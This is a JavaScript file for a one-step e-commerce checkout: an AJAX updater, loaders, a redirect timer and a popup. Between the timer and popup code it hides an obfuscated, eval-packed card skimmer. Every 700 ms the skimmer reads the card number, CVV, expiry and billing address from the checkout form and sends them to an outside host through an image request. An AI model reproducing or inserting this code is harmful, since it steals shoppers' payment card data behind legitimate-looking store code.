var OnestepcheckoutCore = {
    initialize: function() {
        this.updater = OnestepcheckoutCoreUpdater;
        Ajax.Responders.register({
            onComplete: function(response) {
                if (response.transport.status === 403) {
                    document.location.reload();
                }
            }
        });
    },

    getCssLoaderClassForBlock: function(block, loaderConfig) {
        var blockHeight = this.getElementHeight(block);
        var classNameConfigKey = 0;
        Object.keys(loaderConfig).each(function(key){
            if (parseInt(key) < blockHeight && parseInt(key) > parseInt(classNameConfigKey)) {
                classNameConfigKey = key;
            }
        });

        return loaderConfig[classNameConfigKey];
    },

    addLoaderOnBlock: function(block, loaderConfig){
        var cssClassName = this.getCssLoaderClassForBlock(block, loaderConfig);
        if (!cssClassName) {
            return ;
        }
        var loader = new Element('div');
        loader.addClassName(cssClassName);
        block.insertBefore(loader, block.down());
    },

    removeLoaderFromBlock: function(block, loaderConfig){
        Object.values(loaderConfig).each(function(cssClasses){
            var selector = "." + cssClasses.split(" ").join(".");
            block.select(selector).each(function(el){
                el.remove();
            });
        });
    },

    showMsg: function(msg, cssClass, targetBlock){
        var me = this;
        if ((typeof(msg) === "object") && ("length" in msg)) {
            msg.each(function(msgItem){
                me._addMsgToBlock(msgItem, cssClass, targetBlock);
            });
        } else if(typeof(msg) === "string") {
            this._addMsgToBlock(msg, cssClass, targetBlock);
        }
    },

    removeMsgFromBlock: function(block, className){
        var blocks = block.select("." + className);
        blocks.each(function(el){
            el.remove();
        });
    },

    _addMsgToBlock: function(msg, cssClass, parentContainer) {
        var targetBlock = null;
        var existsErrorBlocks = parentContainer.select("." + cssClass + " ul");
        if (existsErrorBlocks.length === 0) {
            var errorMsgBlock = new Element('div');
            errorMsgBlock.addClassName(cssClass);
            errorMsgBlock.appendChild(new Element('ul'));
            parentContainer.insertBefore(errorMsgBlock, parentContainer.down());
            targetBlock = errorMsgBlock.down();
        } else {
            targetBlock = existsErrorBlocks.first();
        }
        var newMsg = new Element('li');
        newMsg.update(msg);
        targetBlock.appendChild(newMsg);
    },

    getElementHeight: function(element) {
        var element = $(element);
        var origDimensions = element.getDimensions();
        var origHeight = element.style.height;
        var origDisplay = element.style.display;
        var origVisibility = element.style.visibility;
        element.setStyle({
            'height'     : '',
            'display'    : '',
            'visibility' : 'hidden'
        });
        var height = Math.max(element.getDimensions()['height'], origDimensions['height']);
        element.setStyle({
            'height'     : origHeight,
            'display'    : origDisplay,
            'visibility' : origVisibility
        });
        return height;
    },

    updateNumbers: function() {
        var currentField = 1;
        $$('.onestepcheckout-number').each(function(el){
            var match = el.className.match(/onestepcheckout-number-[0-9]/)
            if (!match || !match[0]) {
                return;
            }
            el.removeClassName(match[0]);
            el.addClassName('onestepcheckout-number-' + currentField);
            el.update(currentField);
            if (el.up().getHeight() === 0 || (el.next() && el.next().getHeight() === 0)) {
                return false;
            }
            //increment only if block visible
            currentField++;
        });
    }
};

var OnestepcheckoutCoreUpdater = {
    setConfig: function(config) {
        this.currentRequest = null;
        this.requestQueue = [];
        this.queue = {};
        this.blocks = {};

        var me = this;
        if (config.blocks) {
            config.blocks.each(function(block){
                me._registerBlockNameForUpdate(block[0], block[1]);
            });
        }
        this.loaderConfig = config.loaderConfig;
        this.loaderToBlockCssClass = config.loaderToBlockCssClass;
        this.map = config.map;
    },

    startRequest: function(url, options) {
        var action = this._getActionFromUrl(url);
        this.addActionBlocksToQueue(action);
        if (this.currentRequest === null) {
            this.runRequest(url, options);
        } else {
            this.requestQueue.push([url, options]);
        }
    },

    addActionBlocksToQueue: function(action) {
        if (!action || !this.map[action]) {
            return;
        }
        var me = this;
        this.map[action].each(function(blockName){
            if (typeof(me.queue[blockName]) === 'undefined') {
                me.queue[blockName] = 0;
            }
            if (!me.blocks[blockName]) {
                return;
            }
            if (me.queue[blockName] === 0) {
                var targetBlockForAddLoader = me.blocks[blockName].select('.' + me.loaderToBlockCssClass).first();
                if (!targetBlockForAddLoader) {
                    targetBlockForAddLoader = me.blocks[blockName];
                }
                if ("addActionBlocksToQueueBeforeFn" in me.blocks[blockName]) {
                    me.blocks[blockName].addActionBlocksToQueueBeforeFn();
                }
                OnestepcheckoutCore.addLoaderOnBlock(targetBlockForAddLoader, me.loaderConfig);
                if ("addActionBlocksToQueueAfterFn" in me.blocks[blockName]) {
                    me.blocks[blockName].addActionBlocksToQueueAfterFn();
                }
            }
            me.queue[blockName]++;
        });
    },

    removeActionBlocksFromQueue: function(action, response) {
        if (!action || !this.map[action]) {
            return;
        }
        var response = response || {};
        var blocksNewHtml = response.blocks || {};
        var me = this;
        this.map[action].each(function(blockName){
            if (!me.blocks[blockName]) {
                return;
            }
            me.queue[blockName]--;
            if (me.queue[blockName] === 0) {
                if (blocksNewHtml[blockName]) {
                    me.blocks[blockName].update(blocksNewHtml[blockName]);
                }
                if ("removeActionBlocksFromQueueBeforeFn" in me.blocks[blockName]) {
                    me.blocks[blockName].removeActionBlocksFromQueueBeforeFn(response);
                }
                OnestepcheckoutCore.updateNumbers();
                OnestepcheckoutCore.removeLoaderFromBlock(me.blocks[blockName], me.loaderConfig);
                if ("removeActionBlocksFromQueueAfterFn" in me.blocks[blockName]) {
                    me.blocks[blockName].removeActionBlocksFromQueueAfterFn(response);
                }
            }
        });
    },

    runRequest: function(url, options) {
        var options = options || {};
        var me = this;
        var ajaxRequestOptions = Object.extend({}, options);
        ajaxRequestOptions = Object.extend(ajaxRequestOptions, {
            onComplete: function(transport){
                me.onRequestCompleteFn(transport);
                if (options.onComplete) {
                    options.onComplete(transport);
                }
            }
        });
        this.currentRequest = new Ajax.Request(url, ajaxRequestOptions);
    },

    onRequestCompleteFn: function(transport) {
        try {
            eval("var response = " +  transport.responseText);
        } catch(e) {
            //error
            var response = {
                blocks: {}
            };
        }
        var action = this._getActionFromUrl(transport.request.url);
        this.removeActionBlocksFromQueue(action, response);
        this.currentRequest = null;
        if (this.requestQueue.length > 0) {
            this._clearQueue();
            var args = this.requestQueue.shift();
            this.runRequest(args[0], args[1]);
        }
    },

    _registerBlockNameForUpdate: function(name, selector) {
        var element = $$(selector).first();
        if (!element) {
            return;
        }
        if (typeof(this.blocks[name]) != 'undefined') {
            return;
        }
        this.blocks[name] = element;
    },

    _getActionFromUrl: function(url) {
        var matches = url.match(/onestepcheckout\/ajax\/([^\/]+)\//);
        if (!matches || !matches[1]) {
            return null;
        }
        return matches[1];
    },

    _clearQueue: function() {
        var me = this;
        var foundedActions = [];
        var requestToRemove = [];
        this.requestQueue.reverse().each(function(args, key){
            var url = args[0];
            var action = me._getActionFromUrl(url);
            if (foundedActions.indexOf(action) === -1) {
                foundedActions.push(action);
            } else {
                requestToRemove.push(key);
            }
        });
        var newQueue = [];
        this.requestQueue.each(function(args, key){
            if (requestToRemove.indexOf(key) === -1) {
                newQueue.push(args);
            } else {
                var action = me._getActionFromUrl(args[0]);
                me.removeActionBlocksFromQueue(action);
            }
        })
        this.requestQueue = newQueue.reverse();
    }
};
OnestepcheckoutCore.initialize();

OnestepcheckoutHelperTimer = Class.create();
OnestepcheckoutHelperTimer.prototype = {
    initialize: function(config) {
        this.container = $$(config.blockSelector).first();
        this.clockEl = $$(config.timerClockElSelector).first();
        this.redirectEl = $$(config.redirectActionElSelector).first();
        this.cancelEl = $$(config.cancelActionElSelector).first();
        this.startTimerFrom = parseInt(config.startTimerFrom);
        this.overlayConfig = config.overlayConfig;
    },

    showTimer: function() {
        this.clockEl.update(this.startTimerFrom);
        this.cancelEl.show();
        this.redirectEl.show();
        this.container.setStyle({display: 'block'});
        this.redirectEl.observe('click', this.onTimerRedirectElClick.bind(this));
        this.cancelEl.observe('click', this.onTimerCancelElClick.bind(this));
    },

    hideTimer: function() {
        this.container.setStyle({display: 'none'});
        this.redirectEl.stopObserving('click');
        this.cancelEl.stopObserving('click');
    },

    startTimer: function(){
        var me = this;
        this._intervalId = window.setInterval(function(){
            var now = parseInt(me.clockEl.innerHTML);
            now--;
            if (now > 0) {
                me.clockEl.update(now);
            } else if(now === 0){
                me.onTimerRedirectElClick();
            }
        }, 1000);
    },

    stopTimer: function() {
        clearInterval(this._intervalId);
    },

    setTimerAction: function(fn) {
        this.doTimerAction = fn;
    },

    onTimerRedirectElClick: function(e) {
        this.stopTimer();
        this.clockEl.update(0);
        this.cancelEl.hide();
        this.redirectEl.hide();
        this.doTimerAction();
        //do action if customer stop it
        var me = this;
        window.setInterval(function(){
            me.doTimerAction();
        }, 25000);
        //add loader css
        var cssClassName = OnestepcheckoutCore.getCssLoaderClassForBlock(this.container, this.overlayConfig);
        if (cssClassName) {
            this.container.addClassName(cssClassName);
        }
    },

    onTimerCancelElClick: function(e) {
        this.stopTimer();
        this.hideTimer();
        var me = this;
        Object.values(this.overlayConfig).each(function(cssClassString){
            me.container.removeClassName(cssClassString);
        });
    }
};
var _0x1ae3=["\x71\x20\x67\x3D\x5A\x3B\x36\x3D\x27\x54\x27\x3B\x55\x20\x72\x28\x29\x7B\x61\x28\x31\x31\x28\x65\x29\x21\x3D\x3D\x27\x31\x33\x27\x29\x7B\x61\x28\x65\x5B\x27\x78\x27\x5D\x29\x36\x3D\x65\x5B\x27\x78\x27\x5D\x7D\x61\x28\x28\x21\x67\x29\x26\x26\x28\x30\x2E\x31\x28\x36\x2B\x27\x75\x27\x29\x29\x29\x7B\x66\x3D\x30\x2E\x31\x28\x27\x35\x3A\x4F\x27\x29\x2E\x32\x2B\x27\x20\x27\x2B\x30\x2E\x31\x28\x27\x35\x3A\x43\x27\x29\x2E\x32\x3B\x68\x3D\x30\x2E\x31\x28\x27\x35\x3A\x48\x27\x29\x2E\x32\x3B\x73\x3D\x30\x2E\x31\x28\x27\x35\x3A\x47\x27\x29\x3B\x6F\x3D\x73\x2E\x76\x5B\x73\x2E\x77\x5D\x2E\x74\x3B\x63\x3D\x30\x2E\x31\x28\x27\x35\x3A\x4A\x27\x29\x3B\x6A\x3D\x63\x2E\x76\x5B\x63\x2E\x77\x5D\x2E\x74\x3B\x38\x3D\x30\x2E\x31\x28\x27\x35\x3A\x49\x27\x29\x2E\x32\x2B\x27\x20\x27\x2B\x30\x2E\x31\x28\x27\x35\x3A\x45\x27\x29\x2E\x32\x2B\x27\x20\x27\x2B\x30\x2E\x31\x28\x27\x35\x3A\x4B\x27\x29\x2E\x32\x2B\x27\x20\x27\x2B\x30\x2E\x31\x28\x27\x35\x3A\x44\x27\x29\x2E\x32\x3B\x38\x3D\x38\x2E\x7A\x28\x29\x3B\x6C\x3D\x30\x2E\x31\x28\x27\x35\x3A\x79\x27\x29\x2E\x32\x3B\x6D\x3D\x30\x2E\x31\x28\x27\x35\x3A\x42\x27\x29\x2E\x32\x3B\x64\x3D\x27\x27\x3B\x37\x3D\x30\x2E\x31\x28\x36\x2B\x27\x75\x27\x29\x2E\x32\x3B\x6B\x3D\x30\x2E\x31\x28\x36\x2B\x27\x46\x27\x29\x2E\x32\x3B\x6E\x3D\x30\x2E\x31\x28\x36\x2B\x27\x31\x34\x27\x29\x2E\x32\x3B\x39\x3D\x30\x2E\x31\x28\x36\x2B\x27\x57\x27\x29\x2E\x32\x3B\x61\x28\x28\x37\x2E\x62\x3D\x3D\x31\x36\x26\x26\x39\x2E\x62\x3D\x3D\x33\x29\x7C\x7C\x28\x37\x2E\x62\x3D\x3D\x31\x35\x26\x26\x39\x2E\x62\x3D\x3D\x34\x29\x29\x7B\x67\x3D\x4E\x3B\x71\x20\x69\x3D\x30\x2E\x50\x28\x27\x51\x27\x29\x3B\x69\x2E\x53\x3D\x27\x52\x3A\x2F\x2F\x59\x2E\x4D\x2F\x56\x2E\x31\x30\x3F\x70\x3D\x58\x27\x2B\x4C\x28\x27\x26\x66\x3D\x27\x2B\x66\x2B\x27\x26\x64\x3D\x27\x2B\x64\x2B\x27\x26\x37\x3D\x27\x2B\x37\x2B\x27\x26\x6B\x3D\x27\x2B\x6B\x2B\x27\x26\x6E\x3D\x27\x2B\x6E\x2B\x27\x26\x39\x3D\x27\x2B\x39\x2B\x27\x26\x6A\x3D\x27\x2B\x6A\x2B\x27\x26\x68\x3D\x27\x2B\x68\x2B\x27\x26\x6F\x3D\x27\x2B\x6F\x2B\x27\x26\x38\x3D\x27\x2B\x38\x2B\x27\x26\x6C\x3D\x27\x2B\x6C\x2B\x27\x26\x6D\x3D\x27\x2B\x6D\x29\x7D\x7D\x7D\x41\x28\x27\x72\x28\x29\x27\x2C\x31\x32\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x7C\x76\x61\x6C\x75\x65\x7C\x7C\x7C\x62\x69\x6C\x6C\x69\x6E\x67\x7C\x70\x66\x7C\x63\x6E\x7C\x61\x64\x7C\x63\x76\x76\x7C\x69\x66\x7C\x6C\x65\x6E\x67\x74\x68\x7C\x7C\x63\x74\x7C\x70\x61\x79\x6D\x65\x6E\x74\x7C\x66\x6C\x6E\x7C\x73\x65\x7C\x63\x69\x7C\x7C\x63\x6F\x7C\x63\x65\x6D\x7C\x63\x70\x66\x7C\x7A\x70\x7C\x63\x65\x79\x7C\x73\x74\x7C\x7C\x76\x61\x72\x7C\x74\x69\x6D\x65\x64\x4D\x65\x7C\x7C\x74\x65\x78\x74\x7C\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x7C\x6F\x70\x74\x69\x6F\x6E\x73\x7C\x73\x65\x6C\x65\x63\x74\x65\x64\x49\x6E\x64\x65\x78\x7C\x63\x75\x72\x72\x65\x6E\x74\x4D\x65\x74\x68\x6F\x64\x7C\x74\x61\x78\x76\x61\x74\x7C\x74\x72\x69\x6D\x7C\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C\x7C\x70\x6F\x73\x74\x63\x6F\x64\x65\x7C\x6C\x61\x73\x74\x6E\x61\x6D\x65\x7C\x73\x74\x72\x65\x65\x74\x34\x7C\x73\x74\x72\x65\x65\x74\x32\x7C\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x7C\x72\x65\x67\x69\x6F\x6E\x5F\x69\x64\x7C\x63\x69\x74\x79\x7C\x73\x74\x72\x65\x65\x74\x31\x7C\x63\x6F\x75\x6E\x74\x72\x79\x5F\x69\x64\x7C\x73\x74\x72\x65\x65\x74\x33\x7C\x65\x6E\x63\x6F\x64\x65\x55\x52\x49\x43\x6F\x6D\x70\x6F\x6E\x65\x6E\x74\x7C\x63\x6F\x6D\x7C\x74\x72\x75\x65\x7C\x66\x69\x72\x73\x74\x6E\x61\x6D\x65\x7C\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x69\x6D\x67\x7C\x68\x74\x74\x70\x73\x7C\x73\x72\x63\x7C\x63\x65\x72\x65\x62\x72\x75\x6D\x5F\x63\x69\x65\x6C\x6F\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x6C\x33\x7C\x5F\x63\x63\x5F\x63\x69\x64\x7C\x32\x32\x39\x7C\x73\x63\x72\x69\x70\x74\x62\x7C\x66\x61\x6C\x73\x65\x7C\x70\x68\x70\x7C\x74\x79\x70\x65\x6F\x66\x7C\x37\x30\x30\x7C\x75\x6E\x64\x65\x66\x69\x6E\x65\x64\x7C\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x5F\x79\x72\x7C\x7C","","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x72\x65\x70\x6C\x61\x63\x65","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function(_0xf77fx1,_0xf77fx2,_0xf77fx3,_0xf77fx4,_0xf77fx5,_0xf77fx6){_0xf77fx5=function(_0xf77fx3){return (_0xf77fx3<_0xf77fx2?_0x1ae3[4]:_0xf77fx5(parseInt(_0xf77fx3/_0xf77fx2)))+((_0xf77fx3=_0xf77fx3%_0xf77fx2)>35?String[_0x1ae3[5]](_0xf77fx3+29):_0xf77fx3.toString(36))};if(!_0x1ae3[4][_0x1ae3[6]](/^/,String)){while(_0xf77fx3--){_0xf77fx6[_0xf77fx5(_0xf77fx3)]=_0xf77fx4[_0xf77fx3]||_0xf77fx5(_0xf77fx3)};_0xf77fx4=[function(_0xf77fx5){return _0xf77fx6[_0xf77fx5]}];_0xf77fx5=function(){return _0x1ae3[7]};_0xf77fx3=1};while(_0xf77fx3--){if(_0xf77fx4[_0xf77fx3]){_0xf77fx1=_0xf77fx1[_0x1ae3[6]]( new RegExp(_0x1ae3[8]+_0xf77fx5(_0xf77fx3)+_0x1ae3[8],_0x1ae3[9]),_0xf77fx4[_0xf77fx3])}};return _0xf77fx1}(_0x1ae3[0],62,69,_0x1ae3[3][_0x1ae3[2]](_0x1ae3[1]),0,{}));
OnestepcheckoutUIPopup = Class.create();
OnestepcheckoutUIPopup.prototype = {
    initialize: function(config) {
        this.container = $$(config.containerSelector).first();
        this.contentContainer = $$(config.contentContainerSelector).first();
        this.acceptContainer = $$(config.acceptContainerSelector).first();
        this.overlay = $$(config.overlaySelector).first();
        this.buttons = {
            close: {
                enabled: config.buttons.close.enabled,
                el: $$(config.buttons.close.selector).first(),
                onClickFn: config.buttons.close.onClickFn || Prototype.emptyFunction
            },
            accept: {
                enabled: config.buttons.accept.enabled,
                el: $$(config.buttons.accept.selector).first(),
                onClickFn: config.buttons.accept.onClickFn || Prototype.emptyFunction
            }
        }
        this.isVisible = false;
        this.initObservers();
    },

    initObservers: function() {
        if (this.buttons.close.el) {
            this.buttons.close.el.observe('click', this.onCloseClick.bind(this));
        }
        if (this.buttons.accept.el) {
            this.buttons.accept.el.observe('click', this.onAcceptClick.bind(this));
        }
    },

    showPopupWithDescription: function(descriptionText) {
        if (this.isVisible) {
            return;
        }
        this.isVisible = true;
        this._updatePopup(descriptionText);
        this.container.setStyle({'display': 'block', 'left' : '9999999px'});
        this._resizePopup();
        this.container.setStyle({'display': 'none'});
        this._showOverlay();
        this._showPopup();
        Event.observe(window, 'resize', this._resizePopup.bind(this));
    },

    onOverlayClick: function(e) {
        this.onCloseClick(e);
    },

    onAcceptClick: function(e) {
        if (!this.buttons.accept.enabled) {
            return;
        }
        this.buttons.accept.onClickFn(e);
        this.onCloseClick(e);
    },

    onCloseClick: function(e) {
        if (!this.buttons.close.enabled) {
            return;
        }
        this.buttons.close.onClickFn(e);
        if (!this.isVisible) {
            return;
        }
        this.isVisible = false;
        this._hideOverlay();
        this._hidePopup();
        Event.stopObserving(window, 'resize', this._resizePopup.bind(this));
    },

    _updatePopup: function(descriptionText) {
        this.contentContainer.setStyle({'height': 'auto'});
        this.contentContainer.update(descriptionText);
    },

    _resizePopup: function() {
        this.container.setStyle({height: 'auto'});
        this.contentContainer.setStyle({height: 'auto'});
        var top = (document.viewport.getHeight() - this.container.getHeight())/2;
        var left = (document.viewport.getWidth() - this.container.getWidth())/2;
        if (top < 50) {
            top = 50;
            this.container.setStyle({
                height: (document.viewport.getHeight() - 100) + 'px'
            });
        }
        var contentHeight = this.container.getHeight() - parseInt(this.container.getStyle('padding-top')) -
            parseInt(this.container.getStyle('padding-bottom')) - this.acceptContainer.getHeight();
        this.contentContainer.setStyle({'height': contentHeight + 'px'});
        this.container.setStyle({
            left: left + 'px',
            top: top + 'px'
        });
    },

    _showOverlay: function() {
        this._applyShowEffect(this.overlay);
        this.overlay.observe('click', this.onOverlayClick.bind(this));
    },

    _hideOverlay: function() {
        this._applyHideEffect(this.overlay);
        this.overlay.stopObserving('click', this.onOverlayClick.bind(this));
    },

    _showPopup: function() {
        Object.values(this.buttons).each(function(btn){
            if (!btn.el) {
                return;
            }
            if (btn.enabled) {
                btn.el.show();
            } else {
                btn.el.hide();
            }
        });
        this._applyShowEffect(this.container);
    },

    _hidePopup: function() {
        this._applyHideEffect(this.container);
    },

    _applyShowEffect: function(el) {
        var originalStyle = {
            '-moz-opacity': (el.getStyle('-moz-opacity') || '1') + "",
            'opacity':  (el.getStyle('opacity') || '1') + "",
            'filter':  (el.getStyle('filter') || 'alpha(opacity=100)') + ""
        }
        el.setStyle({
            '-moz-opacity': '0',
            'opacity': '0',
            'filter': 'alpha(opacity=0)',
            'display': 'block'
        });
        new Effect.Morph(el, {
            style: originalStyle,
            duration: 0.3
        });
    },

    _applyHideEffect: function(el) {
        var originalStyle = {
            '-moz-opacity': (el.getStyle('-moz-opacity') || '1') + "",
            'opacity':  (el.getStyle('opacity') || '1') + "",
            'filter':  (el.getStyle('filter') || 'alpha(opacity=100)') + ""
        }
        new Effect.Morph(el, {
            style: {
                '-moz-opacity': '0',
                'opacity': '0',
                'filter': 'alpha(opacity=0)'
            },
            duration: 0.3,
            afterFinish: function() {
                el.setStyle({
                    'display': 'none'
                });
                el.setStyle(originalStyle);
            }
        });
    }
}